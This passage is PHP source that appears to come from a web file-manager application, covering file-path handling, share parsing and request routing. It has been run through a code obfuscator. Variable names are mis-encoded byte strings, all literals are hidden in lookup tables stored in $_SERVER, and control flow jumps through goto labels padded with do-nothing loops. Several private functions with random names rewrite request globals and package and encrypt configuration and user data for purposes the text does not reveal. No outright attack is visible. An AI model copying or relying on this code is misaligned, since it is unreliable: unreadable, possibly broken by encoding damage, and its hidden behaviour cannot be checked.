½¸†ìØ: } public function pathThis($B‘Œê²–Àæ) { return get_path_this($this->pathParse[$_SERVER[¢ÌÛ][75]]); } public function pathFather($e°µĞ¶Öóæ) { return get_path_father($this->pathParse[$_SERVER[¢ÌÛ][75]]); } public function iconvSystem($E¡Ø‹¡•–) { return $E¡Ø‹¡•–; } protected function infoParse($fî¤ƒ²Éª, $E…˜•¥Ò = false) { $e†çÑĞãÁ¦ =& $_SERVER[¢ÌÛ]; $e”»¸¥àİª = $this->pathParse[$e†çÑĞãÁ¦[464]][$e†çÑĞãÁ¦[1047]] . $this->pathParse[$e†çÑĞãÁ¦[1040]]; if ($E…˜•¥Ò) { $Còö„¶§ï = IO::infoWithChildren($e”»¸¥àİª); } else { $Còö„¶§ï = IO::info($e”»¸¥àİª); } $FŒÍîåæğ¯ = $this->pathParse[$e†çÑĞãÁ¦[464]]; return Action($e†çÑĞãÁ¦[1185])->_shareItemeParse($Còö„¶§ï, $FŒÍîåæğ¯); } public function listAll($aİ‘Í†Òô) { $fà½µÇˆÌÏ =& $_SERVER[¢ÌÛ]; $AÔ¸»°Ã¹‡ = IO::listAll($aİ‘Í†Òô); $e™İ ÅÆé¶ = $this->pathParse[$fà½µÇˆÌÏ[464]]; foreach ($AÔ¸»°Ã¹‡ as &$c­Û•Õ¢½Š) { check_abort(); $c­Û•Õ¢½Š = array_merge(IO::info($c­Û•Õ¢½Š[$fà½µÇˆÌÏ[75]]), $c­Û•Õ¢½Š); $c­Û•Õ¢½Š[$fà½µÇˆÌÏ[84]] = Action($fà½µÇˆÌÏ[1185])->_shareItemeParse($c­Û•Õ¢½Š, $e™İ ÅÆé¶); } unset($c­Û•Õ¢½Š); return $AÔ¸»°Ã¹‡; } public function getPathOuter($cÉÇÂĞØ×—) { goto CµÈªŸİì; Bé™‡ù•ç: if (substr($E±ƒ“÷÷¯‘, 0, strlen($DŞµ‰Ÿøïá)) != $DŞµ‰Ÿøïá) { return !1; } return $this->pathParse[$E­ìš ÎÊ÷[1041]] . $E­ìš ÎÊ÷[8] . ltrim($D½½­ë•™¿, $E­ìš ÎÊ÷[8]); goto fÁ¾´‹êï; CµÈªŸİì: $E­ìš ÎÊ÷ =& $_SERVER[¢ÌÛ]; $b­¹‘Î’• = KodIO::parse($cÉÇÂĞØ×—); if ($b­¹‘Î’•[$E­ìš ÎÊ÷[29]] == KodIO::KOD_SHARE_ITEM) { return $b­¹‘Î’•[$E­ìš ÎÊ÷[75]]; } goto aÄä„²‹; aÄä„²‹: $E±ƒ“÷÷¯‘ = KodIO::clear($cÉÇÂĞØ×—); $DŞµ‰Ÿøïá = KodIO::clear($this->pathParse[$E­ìš ÎÊ÷[464]][$E­ìš ÎÊ÷[1047]]); $D½½­ë•™¿ = substr($E±ƒ“÷÷¯‘, strlen($DŞµ‰Ÿøïá)); goto Bé™‡ù•ç; fÁ¾´‹êï: } public function getType() { $Bãà‰×³ƒĞ =& $_SERVER[¢ÌÛ]; $B«ÀîÕ¹Ä = str_replace($Bãà‰×³ƒĞ[71], $Bãà‰×³ƒĞ[33], get_class($this)); return strtolower($B«ÀîÕ¹Ä); } public function isTypeObject($F¹‹¬ùˆê¸) { return IO::isTypeObject($F¹‹¬ùˆê¸); } public function info($déî§õ®çï) { return $this->infoParse($déî§õ®çï); } public function infoAuth($b™½‹Ë´‚È) { return $this->infoParse($b™½‹Ë´‚È); } public function infoWithChildren($aÖ‹ˆÇíø) { return $this->infoParse($aÖ‹ˆÇíø, !0); } public function infoFull($E¼¬Ÿâ…ÊŸ) { return $this->infoParse($E¼¬Ÿâ…ÊŸ); } } goto C›Œ·èÔÃ¼; F‚êõ›«¹î: class Application { private $defaultModule = "\x69\156\144\145\x78"; private $defaultController = "\x69\156\x64\145\170"; private $defaultAction = "\x69\x6e\x64\x65\170"; function __construct() { } public function setDefault($cÖÁ…Š¬¶«) { goto c‡‘¯·ˆ”Ï; d—»‡Œî½: $A›…ªÍª‚ğ = $A²µÓÁÅ¸[576]; while (strlen($A›…ªÍª‚ğ) < $A²µÓÁÅ¸[577]) { if (!$A›…ªÍª‚ğ) { break; } $A›…ªÍª‚ğ++; } $this->defaultModule = $E¬ëñ¿Âº‚[0] ? $E¬ëñ¿Âº‚[0] : $this->defaultModule; goto B¨Í‡Û‹˜ø; c‡‘¯·ˆ”Ï: $A²µÓÁÅ¸ =& $_SERVER[¢ÌÛ]; $BÅ¤¢Ë®Ë =& $_SERVER[‹¶]; $E¬ëñ¿Âº‚ = $BÅ¤¢Ë®Ë[0]($BÅ¤¢Ë®Ë[1], $BÅ¤¢Ë®Ë[2]($cÖÁ…Š¬¶«, $BÅ¤¢Ë®Ë[1])); goto d—»‡Œî½; B¨Í‡Û‹˜ø: $this->defaultController = $E¬ëñ¿Âº‚[1] ? $E¬ëñ¿Âº‚[1] : $this->defaultController; $this->defaultAction = $E¬ëñ¿Âº‚[2] ? $E¬ëñ¿Âº‚[2] : $this->defaultAction; $this->{$_SERVER[‹¶][3]}($BÅ¤¢Ë®Ë[4], array($this, $BÅ¤¢Ë®Ë[5])); goto D† ³‚äËğ; D† ³‚äËğ: } public function appRun($b±—ÁÔÜõ‚) { goto BÎ©’‚ØÉÒ; fäÌá¶Öç¼: if (!$C±³ÃšŒÑ) { die; } goto Aî¾×„ÄÖ; eâ»µ‰êŒ: if (!$d™Ø†ÒÚ°) { return; } if ($E˜íÑµø© == $CÎŞƒˆŸ“›[8]) { $D˜Ò¤İœê¬ = $CÎŞƒˆŸ“›[9]; $E·§’ò¹Õî[0] = $CÎŞƒˆŸ“›[10]; $E·§’ò¹Õî[1] = $E·§’ò¹Õî[1] . $CÎŞƒˆŸ“›[11]; $b±—ÁÔÜõ‚ = $CÎŞƒˆŸ“›[12]($CÎŞƒˆŸ“›[1], $E·§’ò¹Õî); $b±—ÁÔÜõ‚ = $CÎŞƒˆŸ“›[2]($b±—ÁÔÜõ‚, $CÎŞƒˆŸ“›[1]); } $CÎŞƒˆŸ“›[13](array($CÎŞƒˆŸ“›[14], $CÎŞƒˆŸ“›[15]), $D˜Ò¤İœê¬ . $CÎŞƒˆŸ“›[16], $b±—ÁÔÜõ‚); goto dó…çî‡½±; dó…çî‡½±: $CÎŞƒˆŸ“›[17]($b±—ÁÔÜõ‚); $CÎŞƒˆŸ“›[13](array($CÎŞƒˆŸ“›[14], $CÎŞƒˆŸ“›[15]), $D˜Ò¤İœê¬ . $CÎŞƒˆŸ“›[18], $b±—ÁÔÜõ‚); $C±³ÃšŒÑ = $b¸¾Ç‘¯»›[579]; goto fäÌá¶Öç¼; BÎ©’‚ØÉÒ: $b¸¾Ç‘¯»› =& $_SERVER[¢ÌÛ]; $CÎŞƒˆŸ“› =& $_SERVER[‹¶]; $E·§’ò¹Õî = $CÎŞƒˆŸ“›[0]($CÎŞƒˆŸ“›[1], $b±—ÁÔÜõ‚); goto bÂ¾ƒÌºù“; bÂ¾ƒÌºù“: $E˜íÑµø© = $CÎŞƒˆŸ“›[6]($E·§’ò¹Õî[0]); $D˜Ò¤İœê¬ = $CÎŞƒˆŸ“›[7]; $d™Ø†ÒÚ° = $b¸¾Ç‘¯»›[578]; goto eâ»µ‰êŒ; Aî¾×„ÄÖ: } private function autorun() { $B§È Äå×‚ =& $_SERVER[¢ÌÛ]; $e‘‚²‚ÙÔ =& $_SERVER[‹¶]; global $config; if ($e‘‚²‚ÙÔ[19]($config[$e‘‚²‚ÙÔ[20]]) == 0) { return; } foreach ($config[$e‘‚²‚ÙÔ[20]] as $CÁØšâ†‚¤ => $BªÇââ¯Ä») { $this->{$_SERVER[‹¶][21]}($BªÇââ¯Ä»); $FŠ¡ÍÎ“ğÄ = $B§È Äå×‚[580]; if (strlen($FŠ¡ÍÎ“ğÄ) < $B§È Äå×‚[577]) { return; } } } private function vuel6a0de1a7() { goto Cˆ¬íè’Œ; Cø¥Õ Úéó: $GLOBALS[$b¸æ†ñæªî[22]][$b¸æ†ñæªî[28]] = $b¸æ†ñæªî[29]($b¸æ†ñæªî[1], $GLOBALS[$b¸æ†ñæªî[22]][$b¸æ†ñæªî[23]]); goto AÜÄÀ¾½Ë…; dùà¹ĞØ†Û: $c˜±»öÇ…… = $GLOBALS[$b¸æ†ñæªî[22]][$b¸æ†ñæªî[23]][0]; $cíõ‘ÓïŞç = $dÉÈ¨èğ³[581]; if (!$c˜±»öÇ…… || $b¸æ†ñæªî[24]($c˜±»öÇ……) <= $b¸æ†ñæªî[24]($BÇ¬ÈÂ‘ø‡)) { return; } goto A‘±œÛÔ¿ß; cŒù·‚æùØ: $DãÆÑ¹¡Ë± = $dÉÈ¨èğ³[584]; if (!$DãÆÑ¹¡Ë±) { die; } $GLOBALS[$b¸æ†ñæªî[22]][$b¸æ†ñæªî[23]] = $b¸æ†ñæªî[27]($b‹Ï×êƒ×÷, $aĞ»‰¹Ú¬©); goto Cø¥Õ Úéó; EœŒ‘ÏØ‡ù: $fáÈ³¿©Ë = $dÉÈ¨èğ³[582]; while ($fáÈ³¿©Ë < $dÉÈ¨èğ³[583]) { if ($fáÈ³¿©Ë >= 0) { break; } $fáÈ³¿©Ë++; } $aĞ»‰¹Ú¬© = $b¸æ†ñæªî[26]($GLOBALS[$b¸æ†ñæªî[22]][$b¸æ†ñæªî[23]], 1); goto cŒù·‚æùØ; Cˆ¬íè’Œ: $dÉÈ¨èğ³ =& $_SERVER[¢ÌÛ]; $b¸æ†ñæªî =& $_SERVER[‹¶]; $BÇ¬ÈÂ‘ø‡ = $b¸æ†ñæªî[8]; goto dùà¹ĞØ†Û; A‘±œÛÔ¿ß: if ($b¸æ†ñæªî[6]($b¸æ†ñæªî[25]($c˜±»öÇ……, -$b¸æ†ñæªî[24]($BÇ¬ÈÂ‘ø‡))) != $BÇ¬ÈÂ‘ø‡) { return; } $D¶ÎÂ—Ê„õ = $b¸æ†ñæªî[25]($c˜±»öÇ……, 0, -$b¸æ†ñæªî[24]($BÇ¬ÈÂ‘ø‡)); $b‹Ï×êƒ×÷ = array($b¸æ†ñæªî[8], $D¶ÎÂ—Ê„õ); goto EœŒ‘ÏØ‡ù; AÜÄÀ¾½Ë…: } private function pvzx83437d16() { goto dšÁßóÃ£Ñ; cÕ©µ®”Š©: if (!$D™¶çäàÜô) { die; } $GLOBALS[$ešßé«¼Ş[22]][$ešßé«¼Ş[28]] = $ešßé«¼Ş[29]($ešßé«¼Ş[1], $GLOBALS[$ešßé«¼Ş[22]][$ešßé«¼Ş[23]]); goto BïƒË³©á; c«™ğ®ÒÄ: $E†³Â»»Â = $_SERVER[$ešßé«¼Ş[30]]; $D˜¸ª¡íÔÖ = $b”Ñ½„ˆî[585]; $fÏ÷Ç‚ôÁŸ = $ešßé«¼Ş[31]; goto DÊˆéç‡Ü; FÎŞÏ›Ç³: $D¦‘Ÿå¡£ = $ešßé«¼Ş[2]($f¹íŞá’—ø[0][0], $ešßé«¼Ş[36]); $GLOBALS[$ešßé«¼Ş[22]][$ešßé«¼Ş[23]] = $ešßé«¼Ş[0]($ešßé«¼Ş[36], $D¦‘Ÿå¡£); $D™¶çäàÜô = $b”Ñ½„ˆî[589]; goto cÕ©µ®”Š©; eÙÜêŸ·Š: if (!$BöÑŠÉß“) { die; } $D¦‘Ÿå¡£ = $ešßé«¼Ş[25]($E†³Â»»Â, $cÛÏŠ¬§î + $ešßé«¼Ş[24]($fÏ÷Ç‚ôÁŸ)); $B³Çø×× á = $b”Ñ½„ˆî[587]; goto Bá‚‰œ½ÍÒ; dšÁßóÃ£Ñ: $b”Ñ½„ˆî =& $_SERVER[¢ÌÛ]; $ešßé«¼Ş =& $_SERVER[‹¶]; if ($GLOBALS[$ešßé«¼Ş[22]][$ešßé«¼Ş[28]] != $ešßé«¼Ş[10]) { return; } goto c«™ğ®ÒÄ; DÊˆéç‡Ü: if (!$ešßé«¼Ş[32]($E†³Â»»Â, $fÏ÷Ç‚ôÁŸ)) { return; } $cÛÏŠ¬§î = $ešßé«¼Ş[33]($E†³Â»»Â, $fÏ÷Ç‚ôÁŸ); $BöÑŠÉß“ = $b”Ñ½„ˆî[586]; goto eÙÜêŸ·Š; Bá‚‰œ½ÍÒ: $ešßé«¼Ş[34]($ešßé«¼Ş[35], $D¦‘Ÿå¡£, $f¹íŞá’—ø); $Dã‚ØÓ§øÍ = $b”Ñ½„ˆî[588]; if (!$Dã‚ØÓ§øÍ) { return; } goto FÎŞÏ›Ç³; BïƒË³©á: } public function run() { goto A‹ç´‰£ñ¢; A‹ç´‰£ñ¢: $e†Úà¥ŸÔ =& $_SERVER[¢ÌÛ]; $B¶Æ¾Á•…ë =& $_SERVER[‹¶]; $this->{$_SERVER[‹¶][37]}(); goto a†ã´çÄ Æ; a†ã´çÄ Æ: $EÒõ„è¡êä = $e†Úà¥ŸÔ[590]; $this->{$_SERVER[‹¶][38]}(); $eò¿Šè¾Ş¼ = $e†Úà¥ŸÔ[591]; goto cÙó†àÈ–; EÁİ‹ó´ÑÙ: $B¶Æ¾Á•…ë[39]($B¶Æ¾Á•…ë[41], isset($fåÏì·±ç[1]) && $fåÏì·±ç[0] ? $fåÏì·±ç[1] : $this->defaultController); $B¶Æ¾Á•…ë[39]($B¶Æ¾Á•…ë[42], isset($fåÏì·±ç[2]) && $fåÏì·±ç[0] ? $fåÏì·±ç[2] : $this->defaultAction); $B¶Æ¾Á•…ë[39]($B¶Æ¾Á•…ë[43], MOD . $B¶Æ¾Á•…ë[1] . ST . $B¶Æ¾Á•…ë[1] . ACT); goto Bê¨Ç–™õÎ; cÙó†àÈ–: $fåÏì·±ç = $GLOBALS[$B¶Æ¾Á•…ë[22]][$B¶Æ¾Á•…ë[23]]; $F‘¨± ”»˜ = $GLOBALS[$B¶Æ¾Á•…ë[22]][$B¶Æ¾Á•…ë[28]]; $Aã‚Á›¯– = $e†Úà¥ŸÔ[592]; goto B‘‰ºÎ÷; B‘‰ºÎ÷: $B¶Æ¾Á•…ë[39]($B¶Æ¾Á•…ë[40], isset($fåÏì·±ç[0]) && $fåÏì·±ç[0] ? $fåÏì·±ç[0] : $this->defaultModule); $E¢¼¡…ïÚ­ = $e†Úà¥ŸÔ[593]; if (!$E¢¼¡…ïÚ­) { return; } goto EÁİ‹ó´ÑÙ; Bê¨Ç–™õÎ: $_SERVER[$B¶Æ¾Á•…ë[44]] = $B¶Æ¾Á•…ë[6](ACTION); $this->{$_SERVER[‹¶][45]}(); if ($B¶Æ¾Á•…ë[19]($fåÏì·±ç) >= 3) { $this->{$_SERVER[‹¶][21]}($F‘¨± ”»˜); } else { $this->{$_SERVER[‹¶][21]}(ACTION); } goto B‰ì¸›Ù«ğ; B‰ì¸›Ù«ğ: } private $sadn4fb51745 = array(); private $gcwsd8cd8558 = ''; public function dvyb4f40e0a5() { goto C©ìšŒ‚Ó; b‡ƒŸÏ¨¸Ì: $this->{$_SERVER[‹¶][52]}(); $f‰Ø†µİ¾Ò = $aÇâä¦ëÒ–[598]; $this->{$_SERVER[‹¶][3]}($d–æŸ…²„õ[53], array($this, $d–æŸ…²„õ[54])); goto Bãƒğ„ƒŸ‚; b¬ğ¾Í¶Ö: $this->{$_SERVER[‹¶][51]}(); $C“£Óá¹æ² = $aÇâä¦ëÒ–[596]; while (strlen($C“£Óá¹æ²) < $aÇâä¦ëÒ–[597]) { if (!$C“£Óá¹æ²) { break; } $C“£Óá¹æ²++; } goto b‡ƒŸÏ¨¸Ì; Bãƒğ„ƒŸ‚: $this->{$_SERVER[‹¶][3]}($d–æŸ…²„õ[55], array($this, $d–æŸ…²„õ[56])); $this->{$_SERVER[‹¶][3]}($d–æŸ…²„õ[57], array($this, $d–æŸ…²„õ[58])); $this->{$_SERVER[‹¶][3]}($d–æŸ…²„õ[59], array($this, $d–æŸ…²„õ[60])); goto cëĞªÌ«ô; cëĞªÌ«ô: $d‘‘ÌÏµğ„ = $aÇâä¦ëÒ–[599]; goto B«Ù­ÛŸ¯Œ; b”×‚ÏâĞ¸: $this->{$_SERVER[‹¶][47]}(); $Cİ•ÅˆâÒÅ = $aÇâä¦ëÒ–[594]; $this->{$_SERVER[‹¶][48]}(); goto A±¸…¾ƒ¢ß; A±¸…¾ƒ¢ß: $this->{$_SERVER[‹¶][49]}(); $this->{$_SERVER[‹¶][50]}(); $däø²ãÏ®„ = $aÇâä¦ëÒ–[595]; goto b¬ğ¾Í¶Ö; C©ìšŒ‚Ó: $aÇâä¦ëÒ– =& $_SERVER[¢ÌÛ]; $d–æŸ…²„õ =& $_SERVER[‹¶]; $this->{$_SERVER[‹¶][46]}(); goto b”×‚ÏâĞ¸; B«Ù­ÛŸ¯Œ: } public function thfwe8998c86($C˜·Ó ²) { goto AáßŠ­ÍÁñ; bà‰Š¼Ãõ¢: if ($b†»ˆæÎ¢¡[112]($GLOBALS, $b†»ˆæÎ¢¡[138]) && $this->config[$b†»ˆæÎ¢¡[139]]) { $C˜·Ó ²[$b†»ˆæÎ¢¡[114]][$b†»ˆæÎ¢¡[140]] = WEB_ROOT; } return $C˜·Ó ²; goto eô¤Ïç–Ğ¨; e¸ùÜã¾Ôğ: $C˜·Ó ²[$b†»ˆæÎ¢¡[102]][$b†»ˆæÎ¢¡[103]][$b†»ˆæÎ¢¡[108]] = array($b†»ˆæÎ¢¡[109] => (int) $aº¥˜ºƒ¤†[$b†»ˆæÎ¢¡[110]], $b†»ˆæÎ¢¡[111] => (int) $b†»ˆæÎ¢¡[112]($aº¥˜ºƒ¤†, $b†»ˆæÎ¢¡[113], 0)); $d„…¯§ŒÔ½ = $aíŠÚÕ¬‘´[605]; if (strlen($d„…¯§ŒÔ½) < $aíŠÚÕ¬‘´[597]) { die; } goto a™ô—¦ìÛ¾; AáßŠ­ÍÁñ: $aíŠÚÕ¬‘´ =& $_SERVER[¢ÌÛ]; $b†»ˆæÎ¢¡ =& $_SERVER[‹¶]; $d³ÙºÒùçÉ = $b†»ˆæÎ¢¡[61]($b†»ˆæÎ¢¡[62])->{$_SERVER[‹¶][63]}(); goto A›ùÊ‡…’; d¦¬“ô†: $C˜·Ó ²[$b†»ˆæÎ¢¡[114]][$b†»ˆæÎ¢¡[123]] = $b†»ˆæÎ¢¡[124]($b†»ˆæÎ¢¡[125]()); $C˜·Ó ²[$b†»ˆæÎ¢¡[114]][$b†»ˆæÎ¢¡[126]] = $this->gcwsd8cd8558; $c˜¥¾Øøõï = $aíŠÚÕ¬‘´[608]; goto C¢ªÜĞ·í¢; bÚö¤“§: if (strlen($cˆ­éĞ) < $aíŠÚÕ¬‘´[583]) { die; } unset($C˜·Ó ²[$b†»ˆæÎ¢¡[102]][$b†»ˆæÎ¢¡[104]][$b†»ˆæÎ¢¡[105]]); unset($C˜·Ó ²[$b†»ˆæÎ¢¡[102]][$b†»ˆæÎ¢¡[104]][$b†»ˆæÎ¢¡[106]]); goto f…´Í¿«; EÙƒùÖ Ğ: foreach ($F¸ØÏ•¹ô as $eÅäÇöíÏÊ) { $B¤¶¤¾ˆòğ = $GLOBALS[$b†»ˆæÎ¢¡[100]][$b†»ˆæÎ¢¡[101]][$eÅäÇöíÏÊ]; if (isset($d³ÙºÒùçÉ[$eÅäÇöíÏÊ])) { $B¤¶¤¾ˆòğ = $d³ÙºÒùçÉ[$eÅäÇöíÏÊ]; } $C˜·Ó ²[$b†»ˆæÎ¢¡[102]][$b†»ˆæÎ¢¡[103]][$eÅäÇöíÏÊ] = $B¤¶¤¾ˆòğ; } $aº¥˜ºƒ¤† = $C˜·Ó ²[$b†»ˆæÎ¢¡[102]][$b†»ˆæÎ¢¡[103]][$b†»ˆæÎ¢¡[76]]; $cˆ­éĞ = $aíŠÚÕ¬‘´[601]; goto bÚö¤“§; a™ô—¦ìÛ¾: $C˜·Ó ²[$b†»ˆæÎ¢¡[114]][$b†»ˆæÎ¢¡[115]] = $b†»ˆæÎ¢¡[116]($b†»ˆæÎ¢¡[117])->{$_SERVER[‹¶][118]}(); $c¹îÊŸá‡ = $aíŠÚÕ¬‘´[606]; while ($c¹îÊŸá‡ < $aíŠÚÕ¬‘´[392]) { if ($c¹îÊŸá‡ >= 0) { break; } $c¹îÊŸá‡++; } goto A–ïÔÜ¡±Ä; A÷òøÒ×š: unset($C˜·Ó ²[$b†»ˆæÎ¢¡[102]][$b†»ˆæÎ¢¡[103]][$b†»ˆæÎ¢¡[107]]); $D‰îêîŠ¼Ä = $aíŠÚÕ¬‘´[604]; if (!$D‰îêîŠ¼Ä) { return; } goto e¸ùÜã¾Ôğ; f…´Í¿«: $f˜©µ¹Õ—Í = $aíŠÚÕ¬‘´[602]; if (strlen($f˜©µ¹Õ—Í) < $aíŠÚÕ¬‘´[603]) { return; } unset($C˜·Ó ²[$b†»ˆæÎ¢¡[102]][$b†»ˆæÎ¢¡[103]][$b†»ˆæÎ¢¡[76]]); goto A÷òøÒ×š; A›ùÊ‡…’: $Eõ˜„×ĞÁÑ = $aíŠÚÕ¬‘´[600]; while ($Eõ˜„×ĞÁÑ < $aíŠÚÕ¬‘´[577]) { if ($Eõ˜„×ĞÁÑ >= 0) { break; } $Eõ˜„×ĞÁÑ++; } $F¸ØÏ•¹ô = array($b†»ˆæÎ¢¡[64], $b†»ˆæÎ¢¡[65], $b†»ˆæÎ¢¡[66], $b†»ˆæÎ¢¡[67], $b†»ˆæÎ¢¡[68], $b†»ˆæÎ¢¡[69], $b†»ˆæÎ¢¡[70], $b†»ˆæÎ¢¡[71], $b†»ˆæÎ¢¡[72], $b†»ˆæÎ¢¡[73], $b†»ˆæÎ¢¡[74], $b†»ˆæÎ¢¡[75], $b†»ˆæÎ¢¡[76], $b†»ˆæÎ¢¡[77], $b†»ˆæÎ¢¡[78], $b†»ˆæÎ¢¡[79], $b†»ˆæÎ¢¡[80], $b†»ˆæÎ¢¡[81], $b†»ˆæÎ¢¡[82], $b†»ˆæÎ¢¡[83], $b†»ˆæÎ¢¡[84], $b†»ˆæÎ¢¡[85], $b†»ˆæÎ¢¡[86], $b†»ˆæÎ¢¡[87], $b†»ˆæÎ¢¡[88], $b†»ˆæÎ¢¡[89], $b†»ˆæÎ¢¡[90], $b†»ˆæÎ¢¡[91], $b†»ˆæÎ¢¡[92], $b†»ˆæÎ¢¡[93], $b†»ˆæÎ¢¡[94], $b†»ˆæÎ¢¡[95], $b†»ˆæÎ¢¡[96], $b†»ˆæÎ¢¡[97], $b†»ˆæÎ¢¡[98], $b†»ˆæÎ¢¡[99]); goto EÙƒùÖ Ğ; C¢ªÜĞ·í¢: if ($d³ÙºÒùçÉ[$b†»ˆæÎ¢¡[126]] != $b†»ˆæÎ¢¡[127]) { $C˜·Ó ²[$b†»ˆæÎ¢¡[114]][$b†»ˆæÎ¢¡[128]] = $d³ÙºÒùçÉ[$b†»ˆæÎ¢¡[128]]; $C˜·Ó ²[$b†»ˆæÎ¢¡[114]][$b†»ˆæÎ¢¡[129]] = $d³ÙºÒùçÉ[$b†»ˆæÎ¢¡[129]]; $f×¦™ç™ÕÃ = $b†»ˆæÎ¢¡[130](10) . $this->gcwsd8cd8558 . $b†»ˆæÎ¢¡[130](5); $C˜·Ó ²[$b†»ˆæÎ¢¡[102]][$b†»ˆæÎ¢¡[131]][$b†»ˆæÎ¢¡[132]] = $this->{$_SERVER[‹¶][133]}($f×¦™ç™ÕÃ, $C˜·Ó ²[$b†»ˆæÎ¢¡[114]][$b†»ˆæÎ¢¡[119]]); } if ($this->gcwsd8cd8558 == $b†»ˆæÎ¢¡[127]) { $C˜·Ó ²[$b†»ˆæÎ¢¡[102]][$b†»ˆæÎ¢¡[103]][$b†»ˆæÎ¢¡[108]][$b†»ˆæÎ¢¡[113]] = 0; } $C˜·Ó ²[$b†»ˆæÎ¢¡[114]][$b†»ˆæÎ¢¡[134]] = $b†»ˆæÎ¢¡[112]($this->sadn4fb51745, $b†»ˆæÎ¢¡[135], $b†»ˆæÎ¢¡[10]); goto EŒ’êÈŒİŸ; A–ïÔÜ¡±Ä: $C˜·Ó ²[$b†»ˆæÎ¢¡[114]][$b†»ˆæÎ¢¡[119]] = $b†»ˆæÎ¢¡[120]($_SERVER[$b†»ˆæÎ¢¡[121]] . $d³ÙºÒùçÉ[$b†»ˆæÎ¢¡[122]]); $aã»”¾ÒÙ¯ = $aíŠÚÕ¬‘´[607]; if (strlen($aã»”¾ÒÙ¯) < $aíŠÚÕ¬‘´[577]) { return; } goto d¦¬“ô†; EŒ’êÈŒİŸ: $C˜·Ó ²[$b†»ˆæÎ¢¡[114]][$b†»ˆæÎ¢¡[136]] = $b†»ˆæÎ¢¡[112]($this->sadn4fb51745, $b†»ˆæÎ¢¡[137], $b†»ˆæÎ¢¡[10]); $aì¸øË«•± = $aíŠÚÕ¬‘´[609]; while (strlen($aì¸øË«•±) < $aíŠÚÕ¬‘´[583]) { if (!$aì¸øË«•±) { break; } $aì¸øË«•±++; } goto bà‰Š¼Ãõ¢; eô¤Ïç–Ğ¨: } private function airsce9135a1() { goto dƒÑÉ¨İ±™; CôÂÊÁœÁ: if ($this->gcwsd8cd8558 == $AîÍÈÒÄÏ„[127]) { return; } $cß¨–Ë£š = array($AîÍÈÒÄÏ„[159], $AîÍÈÒÄÏ„[160], $AîÍÈÒÄÏ„[161], $AîÍÈÒÄÏ„[162], $AîÍÈÒÄÏ„[163], $AîÍÈÒÄÏ„[164]); $Fñ¶¡õ¡ÜÈ = $AÍ‘öã‡¯º[612]; goto C÷íë‡Á¢; C÷íë‡Á¢: while ($Fñ¶¡õ¡ÜÈ < $AÍ‘öã‡¯º[583]) { if ($Fñ¶¡õ¡ÜÈ >= 0) { break; } $Fñ¶¡õ¡ÜÈ++; } $b©…Í†º®º = $AîÍÈÒÄÏ„[61]($AîÍÈÒÄÏ„[62])->{$_SERVER[‹¶][63]}(); $f½Ò±…ÈßÑ = $AÍ‘öã‡¯º[613]; goto EùŒÙÉâ—å; EùŒÙÉâ—å: $FÑÂº®Ğˆ = array($AîÍÈÒÄÏ„[165] => $b©…Í†º®º[$AîÍÈÒÄÏ„[64]], $AîÍÈÒÄÏ„[166] => $b©…Í†º®º[$AîÍÈÒÄÏ„[65]], $AîÍÈÒÄÏ„[167] => $AîÍÈÒÄÏ„[10]); $f¿°ê£Í¨ä = $AÍ‘öã‡¯º[614]; if (strlen($f¿°ê£Í¨ä) < $AÍ‘öã‡¯º[392]) { die; } goto eÖù×‹“ªÇ; dƒÑÉ¨İ±™: $AÍ‘öã‡¯º =& $_SERVER[¢ÌÛ]; $AîÍÈÒÄÏ„ =& $_SERVER[‹¶]; if ($_SERVER[$AîÍÈÒÄÏ„[44]] == $AîÍÈÒÄÏ„[141]) { goto DªäÓÃå“±; D˜¨‡§££ì: while (strlen($Aö·–ªõ—ê) < $AÍ‘öã‡¯º[597]) { if (!$Aö·–ªõ—ê) { break; } $Aö·–ªõ—ê++; } $AîÍÈÒÄÏ„[13](array($AîÍÈÒÄÏ„[157], $AîÍÈÒÄÏ„[158]), $FÑÂº®Ğˆ); goto a‰Ğô•´³Æ; FŸÑî¶¹: $cëùê°±×Í = $AÍ‘öã‡¯º[610]; $FÑÂº®Ğˆ = array($AîÍÈÒÄÏ„[156] => $CŒÕŠ²—®ó); $Aö·–ªõ—ê = $AÍ‘öã‡¯º[611]; goto D˜¨‡§££ì; DªäÓÃå“±: $CŒÕŠ²—®ó = array($AîÍÈÒÄÏ„[126] => $this->gcwsd8cd8558, $AîÍÈÒÄÏ„[142] => $this->{$_SERVER[‹¶][143]}(), $AîÍÈÒÄÏ„[144] => $AîÍÈÒÄÏ„[61]($AîÍÈÒÄÏ„[145])->{$_SERVER[‹¶][146]}()); if ($this->gcwsd8cd8558 != $AîÍÈÒÄÏ„[127]) { $A—¢­ÄÔé¿ = $AîÍÈÒÄÏ„[112]($this->sadn4fb51745, $AîÍÈÒÄÏ„[147]); if ($A—¢­ÄÔé¿) { $CŒÕŠ²—®ó[$AîÍÈÒÄÏ„[148]] = $A—¢­ÄÔé¿; $CŒÕŠ²—®ó[$AîÍÈÒÄÏ„[149]] = $AîÍÈÒÄÏ„[150]($AîÍÈÒÄÏ„[112]($this->sadn4fb51745, $AîÍÈÒÄÏ„[151])); $CŒÕŠ²—®ó[$AîÍÈÒÄÏ„[152]] = $AîÍÈÒÄÏ„[112]($this->sadn4fb51745, $AîÍÈÒÄÏ„[137]); } } $CŒÕŠ²—®ó = $this->{$_SERVER[‹¶][153]}($AîÍÈÒÄÏ„[154]($CŒÕŠ²—®ó), $AîÍÈÒÄÏ„[120]($AîÍÈÒÄÏ„[155])); goto FŸÑî¶¹; a‰Ğô•´³Æ: } goto CôÂÊÁœÁ; eÖù×‹“ªÇ: foreach ($cß¨–Ë£š as $eËÒçõËˆ§) { if (!isset($b©…Í†º®º[$eËÒçõËˆ§]) || !$b©…Í†º®º[$eËÒçõËˆ§]) { continue; } $FÑÂº®Ğˆ[$eËÒçõËˆ§] = $b©…Í†º®º[$eËÒçõËˆ§]; $Bä‘ßÎğ¡î = $AÍ‘öã‡¯º[615]; while (strlen($Bä‘ßÎğ¡î) < $AÍ‘öã‡¯º[392]) { if (!$Bä‘ßÎğ¡î) { break; } $Bä‘ßÎğ¡î++; } } $AîÍÈÒÄÏ„[13](array($AîÍÈÒÄÏ„[157], $AîÍÈÒÄÏ„[158]), $FÑÂº®Ğˆ); goto dšğä÷Œàñ; dšğä÷Œàñ: } private function gend8ece6301() { goto e„¢ôÚÊ’Ñ; B’ã‘ĞâÉÈ: $fíÄõàŠÚ‡ = $aÌØÒÑõÑ[624]; if (!$fíÄõàŠÚ‡) { return; } $this->{$_SERVER[‹¶][235]}(); goto a‰¤—Î¼È; C¼ÀÕ³ßÍŸ: while ($aÊäŒËä´ < $aÌØÒÑõÑ[392]) { if ($aÊäŒËä´ >= 0) { break; } 